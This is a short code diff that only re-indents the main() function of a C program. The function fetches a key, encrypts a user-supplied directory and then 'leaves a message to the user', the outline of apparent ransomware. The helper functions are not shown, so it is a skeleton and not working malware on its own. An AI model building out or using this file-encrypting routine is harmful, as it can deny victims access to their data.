@@ -18,17 +18,17 @@ int main (int argc, char **argv){
 		usage();
 		return 0;
 	}
-  int ID = 0;
-  if(argc == 3){
-    ID = atoi(argv[2]);
-  }
-  // get the key
-  char* key;
-  key = getKey(ID);
-  // encrypt the folder
-  encDir(argv[1], key);
-  free(key);
-  // leave a message to the user
-  leaveExplanation();
-  return 0;
+	int ID = 0;
+	if(argc == 3){
+		ID = atoi(argv[2]);
+	}
+	// get the key
+	char* key;
+	key = getKey(ID);
+	// encrypt the folder
+	encDir(argv[1], key);
+	free(key);
+	// leave a message to the user
+	leaveExplanation();
+	return 0;
 }
